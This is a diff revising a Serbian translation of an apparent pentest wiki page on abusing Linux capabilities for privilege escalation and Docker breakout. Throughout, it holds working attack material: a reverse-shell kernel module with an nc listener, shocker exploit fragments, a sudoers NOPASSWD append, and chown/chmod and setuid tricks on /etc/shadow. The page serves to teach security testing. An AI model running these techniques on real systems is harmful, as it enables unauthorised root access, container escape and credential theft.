 cp reverse-shell.ko lib/modules/$(uname -r)/
 ```
-Na kraju, izvršite potreban Python kod za učitavanje ovog kernel modula:
+Na kraju, izvršite potreban Python code za učitavanje ovog kernel module:
 ```python
 import kmod
 km = kmod.Kmod()
 km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
 km.modprobe("reverse-shell")
 ```
-**Primer 2 sa binary**
+**Primer 2 sa binarnim fajlom**
 
-U sledećem primeru binary **`kmod`** ima ovu capability.
+U sledećem primeru binarni fajl **`kmod`** ima ovu capability.
 ```bash
 getcap -r / 2>/dev/null
 /bin/kmod = cap_sys_module+ep
@@ -660,7 +655,7 @@ getcap -r / 2>/dev/null
 
 **Primer sa okruženjem (Docker breakout)**
 
-Omogućene capabilities unutar Docker kontejnera možete proveriti pomoću:
+Možete proveriti omogućene capabilities unutar docker containera koristeći:
 ```bash
 capsh --print
 Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
@@ -673,9 +668,9 @@ uid=0(root)
 gid=0(root)
 groups=0(root)
 ```
-U prethodnom izlazu možete videti da je capability **SYS_MODULE** omogućena.
+U prethodnom izlazu možete videti da je mogućnost **SYS_MODULE** omogućena.
 
-**Kreirajte** **kernel module** koji će izvršavati reverse shell i **Makefile** za njegovu **kompilaciju**:
+**Kreirajte** **kernel module** koji će izvršiti reverse shell i **Makefile** za njegovu **kompilaciju**:
 ```c:reverse-shell.c
 #include <linux/kmod.h>
 #include <linux/module.h>
@@ -710,7 +705,7 @@ clean:
 make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
 ```
 > [!WARNING]
-> Prazan znak pre svake make reči u Makefile-u **mora biti tabulator, a ne razmaci**!
+> Prazan znak pre svake make naredbe u Makefile-u **mora biti tabulator, a ne razmaci**!
 
 Izvršite `make` da biste ga kompajlirali.
 ```bash
@@ -719,7 +714,7 @@ Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  
 sudo apt update
 sudo apt full-upgrade
 ```
-Na kraju, pokrenite `nc` unutar shell-a i **učitajte modul** iz drugog shell-a i uhvatićete shell u nc procesu:
+Konačno, pokrenite `nc` unutar shell-a i **učitajte modul** iz drugog shell-a, pa ćete uhvatiti shell u nc procesu:
 ```bash
 #Shell 1
 nc -lvnp 4444
@@ -727,16 +722,16 @@ nc -lvnp 4444
 #Shell 2
 insmod reverse-shell.ko #Launch the reverse shell
 ```
-**Kod ove tehnike je preuzet iz laboratorije „Abusing SYS_MODULE Capability“ sa** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)
+**Kod ove tehnike je kopiran iz laboratorije „Abusing SYS_MODULE Capability“ sa** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)<sup>[[1]](#references)</sup>
 
-Još jedan primer ove tehnike možete pronaći na [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)
+Još jedan primer ove tehnike može se pronaći na adresi [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)
 
 ## CAP_DAC_READ_SEARCH
 
-[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) omogućava procesu da **zaobiđe dozvole za čitanje fajlova, kao i za čitanje i izvršavanje direktorijuma**. Njegova primarna namena je pretraga ili čitanje fajlova. Međutim, takođe omogućava procesu da koristi funkciju `open_by_handle_at(2)`, koja može da pristupi bilo kom fajlu, uključujući i one izvan mount namespace-a procesa. Handle koji se koristi u `open_by_handle_at(2)` trebalo bi da bude netransparentni identifikator dobijen pomoću `name_to_handle_at(2)`, ali može da sadrži osetljive informacije, kao što su inode brojevi, koji su podložni izmeni. Potencijal za eksploataciju ove capability, posebno u kontekstu Docker kontejnera, demonstrirao je Sebastian Krahmer pomoću shocker exploit-a, što je analizirano [ovde](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).
+[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) omogućava procesu da **zaobiđe dozvole za čitanje fajlova, kao i za čitanje i izvršavanje direktorijuma**. Njegova primarna namena je pretraga ili čitanje fajlova. Međutim, takođe omogućava procesu da koristi funkciju `open_by_handle_at(2)`, koja može pristupiti bilo kom fajlu, uključujući one izvan mount namespace-a procesa. Handle koji se koristi u funkciji `open_by_handle_at(2)` trebalo bi da bude netransparentni identifikator dobijen pomoću funkcije `name_to_handle_at(2)`, ali može sadržati osetljive informacije, kao što su inode brojevi, koji su podložni izmeni. Potencijal za exploitation ove capability, posebno u kontekstu Docker containers, demonstrirao je Sebastian Krahmer pomoću shocker exploit-a, što je analizirano [ovde](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).<sup>[[12]](#references)[[13]](#references)</sup>
 **To znači da možete** **zaobići provere dozvola za čitanje fajlova i provere dozvola za čitanje/izvršavanje direktorijuma.**
 
-**Primer sa binary-jem**
+**Primer sa binary-em**
 
 Binary će moći da pročita bilo koji fajl. Dakle, ako fajl kao što je tar ima ovu capability, moći će da pročita shadow fajl:
 ```bash
@@ -747,20 +742,20 @@ tar -cxf shadow.tar.gz
 ```
 **Primer sa binary2**
 
-U ovom slučaju pretpostavimo da **`python`** binary ima ovu capability. Da biste izlistali root fajlove, možete da uradite sledeće:
+U ovom slučaju pretpostavimo da **`python`** binary ima ovu capability. Da biste izlistali datoteke korisnika root, možete izvršiti:
 ```python
 import os
 for r, d, f in os.walk('/root'):
 for filename in f:
 print(filename)
 ```
-A da biste pročitali datoteku, možete uraditi:
+A da biste pročitali datoteku, mogli biste da uradite:
 ```python
 print(open("/etc/shadow", "r").read())
 ```
-**Primer u okruženju (Docker breakout)**
+**Example in Environment (Docker breakout)**
 
-Možete proveriti omogućene capabilities unutar docker container-a koristeći:
+Omogućene capabilities unutar Docker kontejnera možete proveriti pomoću:
 ```
 capsh --print
 Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
@@ -773,11 +768,11 @@ uid=0(root)
 gid=0(root)
 groups=0(root)
 ```
-U prethodnom izlazu možete videti da je **DAC_READ_SEARCH** capability omogućena. Kao rezultat toga, container može da **debug processes**.
+U prethodnom izlazu možete videti da je capability **DAC_READ_SEARCH** omogućena. Kao rezultat toga, container može da **debug processes**.
 
-Kako funkcioniše sledeći exploit možete saznati na [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), ali ukratko, **CAP_DAC_READ_SEARCH** nam ne omogućava samo kretanje kroz file system bez provera dozvola, već i eksplicitno uklanja sve provere za _**open_by_handle_at(2)**_ i **može omogućiti našem process-u pristup osetljivim fajlovima koje su otvorili drugi process-i**.
+Kako funkcioniše sledeći exploit možete saznati na [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), ali ukratko, **CAP_DAC_READ_SEARCH** nam ne omogućava samo prolazak kroz file system bez provera dozvola, već i eksplicitno uklanja sve provere za _**open_by_handle_at(2)**_ i **može omogućiti našem procesu pristup osetljivim datotekama koje su otvorili drugi processes**.<sup>[[13]](#references)</sup>
 
-Originalni exploit koji zloupotrebljava ovu permission za čitanje fajlova sa host-a možete pronaći ovde: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), a sledeći kod je **modifikovana verzija koja omogućava da kao prvi argument navedete fajl koji želite da pročitate i da ga sačuvate u fajl.**
+Originalni exploit koji zloupotrebljava ovu dozvolu za čitanje datoteka sa hosta možete pronaći ovde: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), a sledeći kod je **izmenjena verzija koja omogućava da kao prvi argument navedete datoteku koju želite da pročitate i da njen sadržaj sačuvate u datoteci.**<sup>[[12]](#references)</sup>
 ```c
 #include <stdio.h>
 #include <sys/types.h>
@@ -928,39 +923,39 @@ return 0;
 }
 ```
 > [!WARNING]
-> Exploit mora da pronađe pointer ka nečemu što je mountovano na hostu. Originalni exploit je koristio fajl /.dockerinit, a ova izmenjena verzija koristi /etc/hostname. Ako exploit ne radi, možda treba da podesite drugi fajl. Da biste pronašli fajl koji je mountovan na hostu, samo izvršite mount komandu:
+> exploit mora da pronađe pokazivač na nešto montirano na hostu. Originalni exploit je koristio fajl /.dockerinit, a ova izmenjena verzija koristi /etc/hostname. Ako exploit ne radi, možda treba da podesite drugi fajl. Da biste pronašli fajl koji je montiran na hostu, samo izvršite komandu mount:
 
-![CAP SYS MODULE - CAP DAC READ SEARCH: Exploit mora da pronađe pointer ka nečemu što je mountovano na hostu. Originalni exploit je koristio fajl /.dockerinit, a ova izmenjena verzija koristi...](<../../images/image (407) (1).png>)
+![CAP SYS MODULE - CAP DAC READ SEARCH: exploit mora da pronađe pokazivač na nešto montirano na hostu. Originalni exploit je koristio fajl /.dockerinit, a ova izmenjena verzija koristi...](<../../images/image (407) (1).png>)
 
-**Code ove tehnike je preuzet iz laboratorije "Abusing DAC_READ_SEARCH Capability" sa** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)
+**Kod ove tehnike je kopiran iz laboratorije "Abusing DAC_READ_SEARCH Capability" sa** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)<sup>[[1]](#references)</sup>
 
 
 ## CAP_DAC_OVERRIDE
 
-**Ovo znači da možete zaobići provere dozvola za upis u bilo koji fajl, tako da možete upisivati u bilo koji fajl.**
+**To znači da možete zaobići provere dozvola za upis nad bilo kojim fajlom, pa možete upisivati u bilo koji fajl.**
 
-Postoji mnogo fajlova koje možete **prepisati da biste eskalirali privilegije,** [**ideje možete pronaći ovde**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).
+Postoji mnogo fajlova koje možete **prepisati radi eskalacije privilegija,** [**you can get ideas from here**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).
 
 **Primer sa binaryjem**
 
-U ovom primeru vim ima ovu capability, tako da možete izmeniti bilo koji fajl kao što su _passwd_, _sudoers_ ili _shadow_:
+U ovom primeru vim ima ovu capability, pa možete izmeniti bilo koji fajl, kao što su _passwd_, _sudoers_ ili _shadow_:
 ```bash
 getcap -r / 2>/dev/null
 /usr/bin/vim = cap_dac_override+ep
 
 vim /etc/sudoers #To overwrite it
 ```
-**Primer sa binarnom datotekom 2**
+**Primer sa binary 2**
 
-U ovom primeru binarni fajl **`python`** će imati ovu capability. Možete koristiti python za prepisivanje bilo kog fajla:
+U ovom primeru **`python`** binary će imati ovu capability. Možete koristiti python da prepišete bilo koji fajl:
 ```python
 file=open("/etc/sudoers","a")
 file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
 file.close()
 ```
-**Primer sa environment + CAP_DAC_READ_SEARCH (Docker breakout)**
+**Primer sa okruženjem + CAP_DAC_READ_SEARCH (Docker breakout)**
 
-Možete proveriti omogućene capabilities unutar docker container-a koristeći:
+Možete proveriti omogućene capabilities unutar Docker containera pomoću:
 ```bash
 capsh --print
 Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
@@ -973,8 +968,8 @@ uid=0(root)
 gid=0(root)
 groups=0(root)
 ```
-Pre svega pročitajte prethodni odeljak koji [**zloupotrebljava DAC_READ_SEARCH capability za čitanje proizvoljnih datoteka**](linux-capabilities.md#cap_dac_read_search) hosta i **kompajlirajte** exploit.\
-Zatim **kompajlirajte sledeću verziju shocker exploita**, koja će vam omogućiti da **upisujete proizvoljne datoteke** unutar sistema datoteka hosta:
+Pre svega pročitajte prethodni odeljak koji [**abuses DAC_READ_SEARCH capability to read arbitrary files**](linux-capabilities.md#cap_dac_read_search) na hostu i **kompajlirajte** exploit.\
+Zatim, **kompajlirajte sledeću verziju shocker exploita** koja će vam omogućiti da **upisujete proizvoljne fajlove** unutar filesystema hosta:
 ```c
 #include <stdio.h>
 #include <sys/types.h>
@@ -1113,31 +1108,31 @@ close(fd1);
 return 0;
 }
 ```
-Da biste **pobegli** iz docker container-a, mogli biste da **preuzmete** fajlove `/etc/shadow` i `/etc/passwd` sa host-a, da im **dodate** **novog korisnika** i da koristite **`shocker_write`** kako biste ih prepisali. Zatim, **pristupite** putem **ssh**.
+Da biste **pobegli iz** Docker containera, mogli biste da **preuzmete** fajlove `/etc/shadow` i `/etc/passwd` sa hosta, da im **dodate** **novog korisnika** i da upotrebite **`shocker_write`** da biste ih prepisali. Zatim pristupite putem **ssh**.
 
-**Kod ove tehnike je preuzet iz laboratorije "Abusing DAC_OVERRIDE Capability" sa** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)
+**Kod ove tehnike je preuzet iz laboratorije "Abusing DAC_OVERRIDE Capability" sa** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)<sup>[[1]](#references)</sup>
 
 ## CAP_CHOWN
 
 **To znači da je moguće promeniti vlasništvo nad bilo kojim fajlom.**
 
-**Primer sa binary-em**
+**Primer sa binary fajlom**
 
 Pretpostavimo da **`python`** binary ima ovu capability; možete da promenite **vlasnika** fajla **shadow**, **promenite root lozinku** i eskalirate privilegije:
 ```bash
 python -c 'import os;os.chown("/etc/shadow",1000,1000)'
 ```
-Ili sa **`ruby`** binarnim fajlom koji ima ovu capability:
+Ili sa **`ruby`** binarnom datotekom koja ima ovu capability:
 ```bash
 ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
 ```
 ## CAP_FOWNER
 
-**To znači da je moguće promeniti dozvole bilo koje datoteke.**
+**Ovo znači da je moguće promeniti dozvole bilo koje datoteke.**
 
-**Primer sa binary fajlom**
+**Primer sa binary**
 
-Ako python ima ovu capability, možete promeniti dozvole shadow fajla, **promeniti root lozinku** i eskalirati privilegije:
+Ako python ima ovu capability, možete izmeniti dozvole shadow datoteke, **promeniti root lozinku** i eskalirati privilegije:
 ```bash
 python -c 'import os;os.chmod("/etc/shadow",0666)
 ```
@@ -1145,9 +1140,9 @@ python -c 'import os;os.chmod("/etc/shadow",0666)
 
 **To znači da je moguće postaviti efektivni ID korisnika kreiranog procesa.**
 
-**Primer sa binary**
+**Primer sa binarnom datotekom**
 
-Ako python ima ovu **capability**, možete je vrlo lako zloupotrebiti za eskalaciju privilegija na root:
+Ako Python ima ovu **capability**, veoma lako je možete zloupotrebiti za eskalaciju privilegija na root:
 ```python
 import os
 os.setuid(0)
@@ -1164,13 +1159,13 @@ os.system("/bin/bash")
 ```
 ## CAP_SETGID
 
-**To znači da je moguće postaviti efektivni ID grupe kreiranog procesa.**
+**Ovo znači da je moguće postaviti efektivni ID grupe kreiranog procesa.**
 
 Postoji mnogo datoteka koje možete **prepisati da biste eskalirali privilegije,** [**ideje možete pronaći ovde**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).
 
-**Primer sa binarnom datotekom**
+**Primer sa binary**
 
-U ovom slučaju treba da potražite zanimljive datoteke koje grupa može da čita, jer možete da se lažno predstavite kao bilo koja grupa:
+U ovom slučaju treba da potražite zanimljive datoteke koje grupa može da čita, jer možete da se predstavljate kao bilo koja grupa:
 ```bash
 #Find every file writable by a group
 find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
@@ -1179,13 +1174,13 @@ find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
 #Find every file readable by a group in /etc with a maxpath of 1
 find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
 ```
-Kada pronađete fajl koji možete zloupotrebiti (čitanjem ili pisanjem) za eskalaciju privilegija, možete **dobiti shell koji se predstavlja kao zanimljiva grupa** pomoću:
+Kada pronađete datoteku koju možete zloupotrebiti (čitanjem ili pisanjem) za eskalaciju privilegija, možete **dobiti shell koji se predstavlja kao interesantna grupa** pomoću:
 ```python
 import os
 os.setgid(42)
 os.system("/bin/bash")
 ```
-U ovom slučaju je grupa shadow imitirana, tako da možete da čitate fajl `/etc/shadow`:
+U ovom slučaju grupa shadow je impersonirana, tako da možete da čitate datoteku `/etc/shadow`:
 ```bash
 cat /etc/shadow
 ```
@@ -1194,7 +1189,7 @@ cat /etc/shadow
 Kada su obe capabilities dostupne u istom helper-u, praktičan lanac je:
 
 1. Prebaci EGID na `shadow` (ili drugu privilegovanu grupu).
-2. Upotrebi `chown` na `/etc/shadow` da postaviš svoj UID, uz zadržavanje grupe `shadow`.
+2. Koristi `chown` nad `/etc/shadow` da postaviš svoj UID uz zadržavanje grupe `shadow`.
 3. Pročitaj ciljni hash i izvrši crack/pivot.
 ```python
 import os
@@ -1207,9 +1202,9 @@ os.setgid(SHADOW_GID)
 os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
 os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
 ```
-Ovo izbegava potrebu za direktnim full root pristupom i često je dovoljno za pivot kroz ponovnu upotrebu credential-a.
+Ovo izbegava potrebu za direktnim full root pristupom i obično je dovoljno za pivot kroz ponovnu upotrebu credentiala.
 
-Ako je **docker** instaliran, možete **impersonate** **docker group** i zloupotrebiti ga za komunikaciju sa [**docker socket**-om i eskalaciju privilegija](#writable-docker-socket).
+Ako je **docker** instaliran, možete **impersonate** **docker group** i zloupotrebiti ga za komunikaciju sa [**docker socket** i eskalaciju privilegija](#writable-docker-socket).
 
 ## CAP_SETFCAP
 
@@ -1217,7 +1212,7 @@ Ako je **docker** instaliran, možete **impersonate** **docker group** i zloupot
 
 **Primer sa binary**
 
-Ako python ima ovu **capability**, možete je veoma lako zloupotrebiti za eskalaciju privilegija na root:
+Ako python ima ovu **capability**, veoma lako je možete zloupotrebiti za eskalaciju privilegija na root:
 ```python:setcapability.py
 import ctypes, sys
 
@@ -1247,11 +1242,11 @@ python setcapability.py /usr/bin/python2.7
 > [!WARNING]
 > Imajte na umu da ćete, ako binarnoj datoteci postavite novu capability pomoću CAP_SETFCAP, izgubiti ovu capability.
 
-Kada imate [SETUID capability](linux-capabilities.md#cap_setuid), možete preći na njen odeljak da vidite kako da eskalirate privilegije.
+Kada imate [SETUID capability](linux-capabilities.md#cap_setuid), možete preći na njen odeljak da biste videli kako da eskalirate privilegije.
 
-**Primer sa environment-om (Docker breakout)**
+**Primer sa okruženjem (Docker breakout)**
 
-Capability **CAP_SETFCAP se podrazumevano dodeljuje procesu unutar containera u Docker-u**. To možete proveriti tako što ćete uraditi nešto poput:
+Podrazumevano, capability **CAP_SETFCAP se dodeljuje procesu unutar kontejnera u Docker-u**. To možete proveriti tako što ćete uraditi nešto poput:
 ```bash
 cat /proc/`pidof bash`/status | grep Cap
 CapInh: 00000000a80425fb
@@ -1263,8 +1258,8 @@ CapAmb: 0000000000000000
 capsh --decode=00000000a80425fb
 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
 ```
-Ova capability omogućava da se **bilo kojoj drugoj capability dodeli binarni fajl**, pa bismo mogli da razmotrimo **izlazak** iz containera **zloupotrebom bilo kog drugog proboja putem capability** pomenutog na ovoj stranici.\
-Međutim, ako pokušate da binarnom fajlu `gdb` dodelite, na primer, capability `CAP_SYS_ADMIN` i `CAP_SYS_PTRACE`, videćete da ih možete dodeliti, ali **binarni fajl više neće moći da se izvršava nakon toga**:
+Ova capability omogućava da se **binarim datotekama dodeli bilo koja druga capability**, pa bismo mogli da razmišljamo o **escaping-u** iz containera **abusing-om bilo kog drugog capability breakout-a** pomenutog na ovoj stranici.\
+Međutim, ako pokušate da, na primer, dodelite capability CAP_SYS_ADMIN i CAP_SYS_PTRACE gdb binary-ju, videćete da možete da ih dodelite, ali **binary nakon toga neće moći da se izvrši**:
 ```bash
 getcap /usr/bin/gdb
 /usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip
@@ -1274,15 +1269,15 @@ setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb
 /usr/bin/gdb
 bash: /usr/bin/gdb: Operation not permitted
 ```
-[Iz dokumentacije](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: Ovo je **ograničavajući nadskup effective capabilities** koje thread može da preuzme. Takođe predstavlja ograničavajući nadskup capabilities koje thread koji **nema CAP_SETPCAP** capability u svom effective set-u može da doda u inheri‐table set._\
-Izgleda da Permitted capabilities ograničavaju capabilities koje mogu da se koriste.\
-Međutim, Docker podrazumevano takođe dodeljuje **CAP_SETPCAP**, pa biste možda mogli da **postavite nove capabilities unutar inheritable set-a**.\
-Međutim, u dokumentaciji za ovu capability piše: _CAP_SETPCAP : \[…] **add any capability from the calling thread’s bounding** set to its inheritable set_.\
-Izgleda da u inheritable set možemo da dodamo samo capabilities iz bounding set-a. To znači da **ne možemo da dodamo nove capabilities, kao što su CAP_SYS_ADMIN ili CAP_SYS_PTRACE, u inherit set radi eskalacije privilegija**.
+[Iz dokumentacije](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: Ovo je **ograničavajući nadskup za effective capabilities** koje thread može da preuzme. Takođe je ograničavajući nadskup za capabilities koje thread može da doda u inheri­tabilni skup ako **nema CAP_SETPCAP** capability u svom effective skupu._\
+Izgleda da Permitted capabilities ograničavaju one koje mogu da se koriste.\
+Međutim, Docker takođe podrazumevano dodeljuje **CAP_SETPCAP**, pa ćete možda moći da **postavite nove capabilities unutar inheritable skupa**.\
+Međutim, u dokumentaciji za ovu cap navedeno je: _CAP_SETPCAP : \[…] **dodaje bilo koju capability iz bounding skupa pozivajućeg threada u njegov inheritable skup**._\
+Izgleda da u inheritable skup možemo da dodamo samo capabilities iz bounding skupa. To znači da **ne možemo da dodamo nove capabilities, kao što su CAP_SYS_ADMIN ili CAP_SYS_PTRACE, u inherit skup radi eskalacije privilegija**.
 
 ## CAP_SYS_RAWIO
 
-[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) omogućava brojne osetljive operacije, uključujući pristup `/dev/mem`, `/dev/kmem` ili `/proc/kcore`, izmenu `mmap_min_addr`, pristup sistemskim pozivima `ioperm(2)` i `iopl(2)`, kao i različite disk komande. `FIBMAP ioctl(2)` je takođe omogućen pomoću ove capability, što je ranije izazivalo probleme u [prošlosti](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). Prema man stranici, ovo takođe omogućava korisniku da detaljno `perform a range of device-specific operations on other devices`.
+[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) omogućava brojne osetljive operacije, uključujući pristup uređajima `/dev/mem`, `/dev/kmem` ili `/proc/kcore`, izmenu vrednosti `mmap_min_addr`, pristup sistemskim pozivima `ioperm(2)` i `iopl(2)`, kao i različite disk komande. `FIBMAP ioctl(2)` je takođe omogućen pomoću ove capability, što je u [prošlosti](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html) izazivalo probleme. Prema man stranici, ovo takođe omogućava vlasniku da opisno `perform a range of device-specific operations on other devices`.
 
 Ovo može biti korisno za **privilege escalation** i **Docker breakout.**
 
@@ -1290,9 +1285,9 @@ Ovo može biti korisno za **privilege escalation** i **Docker breakout.**
 
 **To znači da je moguće ubiti bilo koji proces.**
 
-**Primer sa binarnim fajlom**
+**Primer sa binaryjem**
 
-Pretpostavimo da **`python`** binary ima ovu capability. Ako biste mogli da **izmenite i neku konfiguraciju servisa ili socket-a** (ili bilo koji configuration file povezan sa servisom), mogli biste da mu dodate backdoor, a zatim da ubijete proces povezan sa tim servisom i sačekate da se nova configuration file izvrši sa vašim backdoor-om.
+Pretpostavimo da **`python`** binary ima ovu capability. Ako biste mogli da **izmenite i neku konfiguraciju servisa ili socketa** (ili bilo koji konfiguracioni fajl povezan sa servisom), mogli biste da ga backdoorujete, a zatim ubijete proces povezan sa tim servisom i sačekate da se nova konfiguraciona datoteka izvrši sa vašim backdoorom.
 ```python
 #Use this python code to kill arbitrary processes
 import os
@@ -1300,9 +1295,9 @@ import signal
 pgid = os.getpgid(341)
 os.killpg(pgid, signal.SIGKILL)
 ```
-**Privesc pomoću kill**
+**Privesc with kill**
 
-Ako imate kill capabilities i postoji **node program koji se izvršava kao root** (ili kao drugi korisnik), verovatno biste mogli da mu **pošaljete** **signal SIGUSR1** i naterate ga da **otvori node debugger**, na koji se možete povezati.
+Ako imate `kill` capabilities i postoji **node program koji se izvršava kao root** (ili kao drugi korisnik), verovatno biste mogli da mu **pošaljete** signal **SIGUSR1** i naterate ga da **otvori node debugger**, na koji se možete povezati.
 ```bash
 kill -s SIGUSR1 <nodejs-ps>
 # After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
@@ -1314,11 +1309,11 @@ kill -s SIGUSR1 <nodejs-ps>
 
 ## CAP_NET_BIND_SERVICE
 
-**To znači da je moguće osluškivati na bilo kom portu (čak i na privilegovanim portovima).** Ovom capability opcijom nije moguće direktno eskalirati privilegije.
+**Ovo znači da je moguće slušati na bilo kom portu (čak i na privilegovanim portovima).** Ovom capability nije moguće direktno eskalirati privilegije.
 
-**Primer sa binarnim fajlom**
+**Primer sa binary**
 
-Ako **`python`** ima ovu capability opciju, moći će da osluškuje na bilo kom portu i da se čak poveže sa njega na bilo koji drugi port (neki servisi zahtevaju povezivanje sa portova sa određenim privilegijama).
+Ako **`python`** ima ovu capability, moći će da sluša na bilo kom portu i da se čak poveže sa njega na bilo koji drugi port (neki services zahtevaju connections sa specifičnih privilegovanih portova)
 
 {{#tabs}}
 {{#tab name="Listen"}}
@@ -1346,22 +1341,22 @@ s.connect(('10.10.10.10',500))
 
 ## CAP_NET_RAW
 
-[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) capability omogućava procesima da **kreiraju RAW i PACKET sockets**, što im omogućava da generišu i šalju proizvoljne mrežne pakete. To može dovesti do bezbednosnih rizika u kontejnerizovanim okruženjima, kao što su spoofing paketa, ubacivanje saobraćaja i zaobilaženje kontrola mrežnog pristupa. Zlonamerni akteri bi ovo mogli da iskoriste za ometanje rutiranja kontejnera ili ugrožavanje bezbednosti mreže hosta, naročito bez odgovarajuće firewall zaštite. Pored toga, **CAP_NET_RAW** je ključan za privilegovane kontejnere radi podrške operacijama kao što je ping putem RAW ICMP zahteva.
+[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) capability omogućava procesima da **kreiraju RAW i PACKET sockets**, čime mogu da generišu i šalju proizvoljne mrežne pakete. Ovo može dovesti do bezbednosnih rizika u kontejnerizovanim okruženjima, kao što su spoofing paketa, ubacivanje saobraćaja i zaobilaženje kontrola mrežnog pristupa. Maliciozni akteri bi ovo mogli da iskoriste za ometanje rutiranja kontejnera ili ugrožavanje bezbednosti mreže hosta, naročito bez odgovarajuće firewall zaštite. Pored toga, **CAP_NET_RAW** je ključan za privilegovane kontejnere kako bi podržali operacije poput ping-a putem RAW ICMP zahteva.
 
-**To znači da je moguće sniffovati saobraćaj.** Ovom capability opcijom nije moguće direktno eskalirati privilegije.
+**To znači da je moguće sniff-ovati saobraćaj.** Ovom capability opcijom nije moguće direktno eskalirati privilegije.
 
 **Primer sa binarnim fajlom**
 
-Ako binarni fajl **`tcpdump`** ima ovu capability opciju, moći ćete da ga koristite za hvatanje informacija sa mreže.
+Ako binary **`tcpdump`** ima ovu capability opciju, moći ćete da ga koristite za prikupljanje informacija o mreži.
 ```bash
 getcap -r / 2>/dev/null
 /usr/sbin/tcpdump = cap_net_raw+ep
 ```
-Imajte na umu da, ako vam **environment** daje ovu capability, možete koristiti i **`tcpdump`** za sniffing saobraćaja.
+Napominjemo da, ako vam **environment** omogućava ovu capability, možete koristiti i **`tcpdump`** za presretanje saobraćaja.
 
-**Primer sa binary 2**
+**Example with binary 2**
 
-Sledeći primer je kod u **`python2`** jeziku koji može biti koristan za presretanje saobraćaja na interfejsu "**lo**" (**localhost**). Kod potiče iz laba "_The Basics: CAP-NET_BIND + NET_RAW_" sa [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com).
+Sledeći primer je kod u jeziku **`python2`** koji može biti koristan za presretanje saobraćaja na interfejsu "**lo**" (**localhost**). Kod potiče iz lab-a "_The Basics: CAP-NET_BIND + NET_RAW_" sa adrese [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)<sup>[[1]](#references)</sup>.
 ```python
 import socket
 import struct
@@ -1407,9 +1402,9 @@ count=count+1
 ```
 ## CAP_NET_ADMIN + CAP_NET_RAW
 
-[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) capability daje njenom nosiocu mogućnost da **menja network konfiguracije**, uključujući firewall podešavanja, routing tabele, socket dozvole i podešavanja network interfejsa unutar dostupnih network namespaces. Takođe omogućava uključivanje **promiscuous mode** na network interfejsima, što omogućava sniffing paketa kroz namespaces.
